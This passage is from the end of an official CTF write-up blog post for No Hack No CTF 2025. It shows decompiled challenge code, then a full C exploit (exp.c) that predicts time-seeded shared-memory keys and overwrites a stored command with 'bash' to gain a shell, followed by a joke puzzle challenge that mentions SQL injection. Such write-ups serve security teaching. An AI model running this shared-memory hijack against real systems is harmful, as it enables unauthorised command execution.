&#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;popen failed&quot;</span>);</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v5 != __readfsqword(<span class="number">0x28</span>u) )</span><br><span class="line">    <span class="keyword">return</span> term_proc();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Since linux shared memory structure can be access by different process, we can edit the shared memory blocks with keys generated by random around the time, change the command and get shell!<br><strong>exp.c</strong>  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;=== Tiny Encrypt Shared Memory Race Condition Exploit ===\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Attempting to hijack shared memory...\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="type">time_t</span> now = (<span class="type">unsigned</span> <span class="type">int</span>) time(<span class="literal">NULL</span>);</span><br><span class="line">    srand(now);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> time_offset = <span class="number">-2</span>; time_offset &lt;= <span class="number">2</span>; time_offset++) &#123;</span><br><span class="line">        srand(now + time_offset);</span><br><span class="line">        <span class="type">int</span> key = rand() % <span class="number">0xfffff</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Trying key: 0x%X (time offset: %d)\n&quot;</span>, key, time_offset);</span><br><span class="line">        </span><br><span class="line">        <span class="type">int</span> shmid = shmget(key, <span class="number">0x400</span>, <span class="number">0x3b6</span>);</span><br><span class="line">        <span class="keyword">if</span> (shmid != <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="type">char</span> *h_shm = shmat(shmid, (<span class="type">void</span> *) <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span> (h_shm != (<span class="type">char</span> *)<span class="number">-1</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Successfully connected to shared memory!\n&quot;</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Original content: %s\n&quot;</span>, h_shm);</span><br><span class="line">                </span><br><span class="line">                <span class="built_in">snprintf</span>(h_shm, <span class="number">0x400</span>, <span class="string">&quot;bash&quot;</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Modified content to: %s\n&quot;</span>, h_shm);</span><br><span class="line">                </span><br><span class="line">                shmdt(h_shm);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Failed to find target shared memory segment.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The program might not be running or already finished.\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;                      </span><br></pre></td></tr></table></figure>
<p><del>But I forget to use a full PATH like <code>/usr/bin/dmesg</code>, so a PATH abuse can be done</del>  </p>
<h2 id="GuessyCTF"><a href="#GuessyCTF" class="headerlink" title="GuessyCTF"></a>GuessyCTF</h2><h3 id="GuessyCTF-1"><a href="#GuessyCTF-1" class="headerlink" title="GuessyCTF"></a>GuessyCTF</h3><p><del>Just a pure waste of time</del><br>After all, have fun (cuz this is just for fun) and relax XD<br>I was just like, oh, why not making a challenge fullfill as much as possible boxes on the “Bad CTF Bingo”<br>Let’s go!<br><img src="https://hackmd.io/_uploads/S1doEgFrll.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/B1tCNetSll.png" alt="image"><br><strong>Steps</strong><br>Step 1. Extract GIF and get “URL”<br><img src="https://hackmd.io/_uploads/H1IlHeYBxg.png" alt="image">  </p>
<p>Step 2. nc to it! is a calculator, and also, 42 is the best answer  </p>
<p><img src="https://hackmd.io/_uploads/Syv7SxtSel.png" alt="image">  </p>
<p>Step 3. Decrypt the message with keys in discord servers!  </p>
<p><img src="https://hackmd.io/_uploads/BJscSxYBgx.png" alt="image">  </p>
<p>Yep, like this<br>key characters or words are all inside <code>&lt;</code> and <code>&gt;</code>  </p>
<p>Step 4. Find a wierd twitter guy and crack his blog’s password via SQL Injection<br><img src="https://hackmd.io/_uploads/Hyxk8xtrxl.png" alt="image">  </p>
<p>Or  </p>
<p>Take a look at my github<br><a target="_blank" rel="noopener" href="https://github.com/William957-web/My-CTF-Challenges/blob/main/README.md#2024-%E6%98%A5%E5%AD%A3%E7%A4%BE%E5%85%A7%E8%B3%BD">https://github.com/William957-web/My-CTF-Challenges/blob/main/README.md#2024-%E6%98%A5%E5%AD%A3%E7%A4%BE%E5%85%A7%E8%B3%BD</a>  </p>
<p>In here: <a target="_blank" rel="noopener" href="https://hackmd.io/@Whale120/S1drvBYlR#/">https://hackmd.io/@Whale120/S1drvBYlR#/</a> has a solution for this XD  </p>
<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2>
  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/search/">Search</a></li>
        
          <li><a href="/tags/">tags</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XXS-XSS"><span class="toc-number">2.1.</span> <span class="toc-text">XXS XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#When"><span class="toc-number">2.2.</span> <span class="toc-text">When?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NOT-XSS"><span class="toc-number">2.3.</span> <span class="toc-text">NOT XSS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">3.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#bloCkchAin-ciphEr%E2%80%99S-sERcret"><span class="toc-number">3.1.</span> <span class="toc-text">bloCkchAin ciphEr’S sERcret</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%90%BA-Verifier"><span class="toc-number">3.2.</span> <span class="toc-text">🐺 Verifier</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%90%BA-Verifier-1"><span class="toc-number">3.3.</span> <span class="toc-text">🐺 Verifier +</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%90%BA-Verifier-Max"><span class="toc-number">3.4.</span> <span class="toc-text">🐺 Verifier Max</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse"><span class="toc-number">4.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Yep-another-smake-game"><span class="toc-number">4.1.</span> <span class="toc-text">Yep another smake game</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IECD-SHELL"><span class="toc-number">4.2.</span> <span class="toc-text">IECD-SHELL</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN"><span class="toc-number">5.</span> <span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Server-Status-and-revenge"><span class="toc-number">5.1.</span> <span class="toc-text">Server Status (and revenge)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GuessyCTF"><span class="toc-number">6.</span> <span class="toc-text">GuessyCTF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GuessyCTF-1"><span class="toc-number">6.1.</span> <span class="toc-text">GuessyCTF</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#After-all"><span class="toc-number">7.</span> <span class="toc-text">After all</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2025/07/07/2025-nhnc-official/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2025/07/07/2025-nhnc-official/&text=No Hack No CTF 2025 Official Write Up - Whale120"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2025/07/07/2025-nhnc-official/&title=No Hack No CTF 2025 Official Write Up - Whale120"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2025/07/07/2025-nhnc-official/&is_video=false&description=No Hack No CTF 2025 Official Write Up - Whale120"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=No Hack No CTF 2025 Official Write Up - Whale120&body=Check out this article: http://wha13.github.io/2025/07/07/2025-nhnc-official/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2025/07/07/2025-nhnc-official/&title=No Hack No CTF 2025 Official Write Up - Whale120"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2025/07/07/2025-nhnc-official/&title=No Hack No CTF 2025 Official Write Up - Whale120"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2025/07/07/2025-nhnc-official/&title=No Hack No CTF 2025 Official Write Up - Whale120"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2025/07/07/2025-nhnc-official/&title=No Hack No CTF 2025 Official Write Up - Whale120"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2025/07/07/2025-nhnc-official/&name=No Hack No CTF 2025 Official Write Up - Whale120&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2025/07/07/2025-nhnc-official/&t=No Hack No CTF 2025 Official Write Up - Whale120"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023-2025
    William Lin
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
